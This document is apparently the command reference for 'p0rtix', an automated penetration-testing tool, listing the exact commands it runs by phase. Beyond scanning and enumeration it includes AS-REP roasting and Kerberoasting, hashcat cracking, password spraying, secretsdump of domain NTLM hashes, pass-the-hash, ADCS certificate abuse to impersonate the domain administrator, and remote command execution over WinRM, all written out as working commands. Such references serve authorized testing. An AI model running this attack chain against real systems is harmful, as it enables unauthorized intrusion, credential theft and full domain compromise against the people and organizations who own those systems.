# p0rtix — Command Reference

Every external command p0rtix can issue, grouped by phase and handler. Generated from the source (`lib/`, `p0rtix.py`); flags are exact. Each command runs through `Runner.run()` / `run_live()` and its full output is saved under `raw/`.

**Placeholder legend:** `<ip>` target · `<domain>` AD domain · `<user>`/`<pw>` credential · `<nt_hash>` NT hash · `<port>` service port · `<ports>` comma-list · `<url>`/`<base_url>` web endpoint · `<prefix>` nmap `-oA` path · `<wl>` wordlist · `<out>` output path.

---

## Phase 1–2 · Port & service discovery (`lib/nmap.py`)

```bash
# Full TCP SYN sweep
nmap -n --reason -sS -Pn -p- --open --min-rate 2000 --max-retries 2 --stats-every 60s -oA <prefix> <ip>
# UDP top-100
nmap -n -sU -T3 -Pn --top-ports 100 --stats-every 60s -oA <prefix> <ip>
# UDP confirmation (version probe on open|filtered)
nmap -n -sU -sV --version-intensity 0 -Pn -p <ports> --stats-every 60s -oA <prefix> <ip>
# TCP service/version detection
nmap -n -sS -sV --version-light -Pn -p <ports> --stats-every 60s -oA <prefix> <ip>
```

---

## Phase 3 · Per-service enumeration (`lib/services.py`)

### FTP
```bash
nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p <port> -sV <ip>
curl -sk ftp://<ip>/ --user anonymous:anonymous --connect-timeout 10 -l
```

### SSH / Telnet / Finger
```bash
nmap --script ssh-auth-methods,ssh2-enum-algos -p <port> <ip>
nmap --script telnet-ntlm-info,telnet-encryption -p <port> <ip>
nc -w 5 <ip> <port>
nmap --script finger -p <port> <ip>
```

### SMTP / POP3 / IMAP
```bash
nmap --script smtp-commands,smtp-open-relay -p <port> <ip>
smtp-user-enum -M VRFY -U <wl> -t <ip> -p <port>
nmap --script pop3-capabilities,pop3-ntlm-info -p <port> <ip>
nmap --script imap-capabilities,imap-ntlm-info -p <port> <ip>
```

### DNS
```bash
dig -x <ip> @<ip>
dig SRV <srv>.<domain> @<ip>
dnsrecon -d <domain> -t axfr,std -n <ip>
```

### Kerberos (time sync prereq)
```bash
timedatectl set-ntp false
ntpdate -u <ip>
```

### MSRPC / RPC
```bash
nmap --script msrpc-enum -p <port> <ip>
impacket-rpcdump -p <port> <ip>
rpcinfo -p <ip>
showmount -e <ip>
```

### SMB
```bash
nmap --script smb2-security-mode -p <port> <ip>
nmap --script <vuln-scripts> --script-args unsafe=1 -p <port> <ip>     # smb-vuln-*
nxc smb <ip> -M zerologon                                             # only with --deep (high-noise)
nxc smb <ip> -u '' -p ''                                               # null session
nxc smb <ip> -u '' -p '' --shares
nxc smb <ip> -u Guest -p ''
nxc smb <ip> -u Guest -p '' --shares
nxc smb <ip> -u <user> -p <pw> --users
impacket-lookupsid -no-pass <domain>/@<ip>                             # RID cycling
enum4linux-ng -A <ip>
# Share spidering (when a session is available)
smbclient \\<ip>\<share> <auth> -c 'recurse; ls'
smbmap -H <ip> <auth> -r <share> --no-write-check -q
nxc smb <ip> -u <user> -p <pw> -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=<out> MAX_FILE_SIZE=5000000
```

### LDAP
```bash
ldapsearch -x -H <uri> -b '' -s base                                  # RootDSE
ldapsearch -x -H <uri> -b <base_dn> <filter> <attrs>                  # users/computers/groups/policy/etc.
```

### SNMP
```bash
onesixtyone -c <community-list> <ip>
snmp-check <ip> -c <community>
snmpwalk -v 2c -c <community> <ip>
snmpwalk -v 3 -l noAuthNoPriv -u <username> <ip>                       # SNMPv3 user probe
```

### Databases
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info,ms-sql-config -p <port> <ip>
nxc mssql <ip> -u sa -p ''
nmap --script mysql-info,mysql-empty-password,mysql-enum -p <port> <ip>
mysql -u root -h <ip> --connect-timeout 10 -e 'show databases;'
nmap -sV --script banner -p <port> <ip>                               # postgres: version/banner only (no brute)
psql -h <ip> -U postgres -c '\l' --no-password
nmap --script oracle-tns-version,oracle-sid-brute -p <port> <ip>
nmap --script mongodb-info,mongodb-databases -p <port> <ip>
redis-cli -h <ip> info server
redis-cli -h <ip> keys '*'
```

### Other services
```bash
rsync rsync://<ip>/
rsync -av --list-only rsync://<ip>/<module>/
showmount -e <ip>                                                     # NFS
nmap --script nfs-ls,nfs-showmount -p 2049 <ip>
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p <port> <ip>
nmap --script vnc-info -p <port> <ip>                                 # info only (no vnc-brute)
nmap --script http-ntlm-info -p <port> <ip>                          # WinRM
nxc winrm <ip> -u '' -p ''
nmap -sU --script ipmi-version,ipmi-cipher-zero -p <port> <ip>
ipmitool -I lanplus -C 0 -H <ip> -U ADMIN -P '' user list
echo 'stats' | nc -w 3 <ip> <port>                                   # memcached
echo 'stats items' | nc -w 3 <ip> <port>
nmap -sU --script tftp-enum -p 69 <ip>
curl -sk --max-time 5 tftp://<ip>/<file> -o <out>
nmap -sV -p <port> --script ajp-headers,ajp-request <ip>
nmap -sV --script banner -p <port> <ip>                              # Jenkins
curl -sk --max-time 10 http://<ip>:8080/api/json
# Docker / Elasticsearch / Splunk APIs
curl -sk --max-time 10 <base>/info
curl -sk --max-time 10 <base>/containers/json?all=1
curl -sk --max-time 10 <base>/images/json
curl -sk --max-time 10 <base>                                        # ES root
curl -sk --max-time 10 <base>/_cluster/health?pretty
curl -sk --max-time 10 <base>/_cat/indices?v
curl -sk --max-time 10 <base>/_nodes?pretty
curl -sk --max-time 10 <base>/services/server/info?output_mode=json  # Splunk
```

---

## Phase 3 · Web enumeration (`lib/web.py`, 17 steps/endpoint)

```bash
# Fingerprint / headers / methods / redirect
curl -sS -k -I -L --max-time 15 <url>
whatweb --no-errors -a 3 <url>
nmap --script http-ntlm-info -p <port> <ip>
curl -sk --max-time 10 -X OPTIONS -I <url>
curl -sS -k -L --max-time 15 -o /dev/null -w '%{url_effective}' <url>
# robots / sensitive files / .git
curl -sk --max-time 10 -o /dev/null -w '%{http_code}' <base_url>/robots.txt
curl -sS -k --max-time 10 <base_url>/robots.txt
curl -sk --max-time 8 -o /dev/null -w '%{http_code}' <base_url><path>
git-dumper <base_url>/.git/ <out>
# TLS
openssl s_client -connect <ip>:<port> -servername <ip> -showcerts
openssl x509 -noout -text
testssl.sh --color 0 --quiet --fast <ip>:<port>
# CORS
curl -sk --max-time 10 -H 'Origin: https://evil-p0rtix.com' -I <base_url>
# App fingerprints (Tomcat / phpMyAdmin / Splunk / ADCS web / Jenkins / Next.js)
curl -sk --max-time 8 -o /dev/null -w '%{http_code}' <base_url><path>
# GraphQL
curl -sk --max-time 8 -X POST -H 'Content-Type: application/json' -d '{"query":"{__typename}"}' -w '%{http_code}' <base_url><path>
curl -sk --max-time 10 -X POST -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}' <base_url><path>
# WordPress / Joomla / Drupal
wpscan --url <base_url> --enumerate p,u,t,cb,dbe --no-banner --disable-tls-checks
joomscan --url <base_url>
droopescan scan drupal --url <base_url>
# Directory / API / cewl / vhost busting
ffuf -u <base_url>/FUZZ -w <wl> -fc 404 -t <threads> -timeout <t> -ic -noninteractive
cewl <base_url> -d 2 -m 5 -w <out> --lowercase --with-numbers
ffuf -u <base_url>/FUZZ -w <cewl-wl> -fc 404 -t <threads> -timeout <t> -ic -noninteractive
ffuf -u <base_url><prefix>/FUZZ -w <wl> -fc 404 -t <threads> -timeout <t> -ic -noninteractive
ffuf -u <url> -H 'Host: FUZZ.<domain>' -w <vhost-wl> -fc 404 -t <threads> -timeout <t> -ic -noninteractive
curl -sk --max-time 10 -o /dev/null -w '%{size_download}' -H 'Host: p0rtix-baseline-probe.invalid' <url>
# Crawl / JS scrape / param fuzz (--deep)
gospider -s <base_url> -c 5 -d 2 --include-subs --no-redirect -q
curl -sk --max-time 10 <url>
arjun -u <base_url> --stable -oT /dev/stdout
```

---

## Phase 5 · Post-domain checks (`p0rtix.py`)

```bash
impacket-GetNPUsers <domain>/ -no-pass -dc-ip <ip> -request -format hashcat -usersfile <users.txt>   # AS-REP roast
kerbrute userenum --dc <ip> -d <domain> <users.txt>
dig SRV <srv>.<domain> @<ip>                                          # _ldap/_kerberos/_kpasswd/_gc/_msdcs/_sites
dnsrecon -d <domain> -t axfr,std -n <ip>
searchsploit --nmap <tcp_services.xml>
```

---

## Phase 6 · Offline cracking (`lib/crack.py`)

```bash
# attack — straight rockyou, no rules; -O optimized, --runtime backstop
hashcat -m <mode> -a 0 <hash-file> <rockyou> --potfile-path <pot> -O --force --quiet --runtime 1200 [--username]
# extract cracked plaintext
hashcat -m <mode> <hash-file> --show --potfile-path <pot> --quiet [--username]
# modes: 18200 AS-REP · 13100 Kerberoast · 1000 NTLM
# rockyou: /usr/share/wordlists/rockyou.txt or /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

---

## Phase 7 · Credential reuse / spray (`p0rtix.py`)

```bash
nxc smb <ip> -u <users.txt> -p <password> --continue-on-success
nxc winrm <ip> -u <users.txt> -p <password> --continue-on-success
```

---

## Credentialed mode (`lib/credsmode.py`)

### Validation & exec
```bash
nxc smb <ip> -u <user> -p <pw> --no-bruteforce        # validate
nxc smb <ip> -u <user> -p <pw>                         # admin check (Pwn3d!)
nxc smb <ip> -u <user> -H <nt_hash>                    # pass-the-hash verify
```

### AD core
```bash
ldapdomaindump -u <domain>\<user> -p <pw> --no-grep -o <out> ldap://<ip>
impacket-GetUserSPNs <domain>/<user>:<pw> -dc-ip <ip> -request          # kerberoast
impacket-GetNPUsers <domain>/ -dc-ip <ip> -no-pass -request -usersfile <users.txt>
impacket-GetNPUsers <domain>/<user>:<pw> -dc-ip <ip> -request
bloodhound-python -c <collection> -u <user> -p <pw> -d <domain> --auth-method ntlm --dns-tcp --zip -o <out> -ns <ip>
impacket-secretsdump <domain>/<admin>:<pw>@<ip> -just-dc-ntlm
nxc smb <ip> -u <user> -p <pw> -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=<out>
gpp-decrypt <cpassword>
```

### LAPS / gMSA / writable-object discovery
```bash
nxc <proto> <ip> -u <user> -p <pw> -d <domain> -M laps
nxc ldap <ip> -u <user> -p <pw> -d <domain> -M gmsa
ldapsearch -x -H <uri> -D <user>@<domain> -w <pw> -b <base_dn> '(objectClass=msDS-GroupManagedServiceAccount)' sAMAccountName msDS-ManagedPassword
bloodyAD --host <ip> -d <domain> -u <user> -p <pw> get writable --otype <otype>
```

### ADCS / certipy (ESC1 / ESC4 / ESC9 / shadow creds)
```bash
certipy-ad find -u <user>@<domain> -p <pw> -dc-ip <ip> -stdout -vulnerable
certipy-ad find -u <user>@<domain> -p <pw> -dc-ip <ip> -enabled -stdout -output <out>
certipy-ad req -u <user>@<domain> -p <pw> -ca <ca> -template <tmpl> -upn administrator@<domain> -dc-ip <ip> -out <out>
certipy-ad auth -pfx <pfx> -dc-ip <ip> -domain <domain> -username administrator
certipy-ad template -u <user>@<domain> -p <pw> -template <tmpl> -save-old -dc-ip <ip>             # ESC4 patch
certipy-ad template -u <user>@<domain> -p <pw> -template <tmpl> -configuration <json> -dc-ip <ip> # ESC4 restore
certipy-ad shadow auto -u <user>@<domain> -p <pw> -account <target> -dc-ip <ip>
certipy-ad account update -u <user>@<domain> -p <pw> -user <target> -upn administrator@<domain> -dc-ip <ip>   # ESC9
certipy-ad req -u <target>@<domain> -hashes :<nt_hash> -ca <ca> -template <tmpl> -dc-ip <ip> -out <out>
```

### Per-service credentialed access & spray
```bash
nxc smb <ip> -u <user> -p <pw> --shares
nxc winrm <ip> -u <user> -p <pw>
nxc winrm <ip> -u <user> -p <pw> -X <command>
sshpass -p <pw> ssh -o BatchMode=no -o StrictHostKeyChecking=no -o ConnectTimeout=8 -o PasswordAuthentication=yes -p <port> <user>@<ip> '<recon one-liner>'
curl -sk ftp://<ip>:<port>/ --user <user>:<pw> --ftp-pasv --connect-timeout 10 -l
nxc mssql <ip> -u <user> -p <pw> --port <port> -q 'SELECT name FROM master..sysdatabases'
nxc rdp <ip> -u <user> -p <pw> --port <port>
mysql -u <user> -p<pw> -h <ip> --port <port> --connect-timeout 8 -e 'SHOW DATABASES; SELECT user, host FROM mysql.user;'
psql -h <ip> -p <port> -U <user> -c '\l' -c 'SELECT current_user, pg_postmaster_start_time();' --no-password -w
redis-cli -h <ip> -p <port> -a <pw> --no-auth-warning info server
redis-cli -h <ip> -p <port> -a <pw> --no-auth-warning keys '*'
# Spray a single password across all known users
nxc smb <ip> -u <users.txt> -p <password> --continue-on-success --no-bruteforce
nxc winrm <ip> -u <users.txt> -p <password> --continue-on-success --no-bruteforce
```

### Time sync (Kerberos prereq)
```bash
timedatectl set-ntp false
ntpdate -u <ip>
```

---

## Environment (`p0rtix.py`)
```bash
chown -R <sudo_user>: <workspace>        # restore ownership after sudo run
```
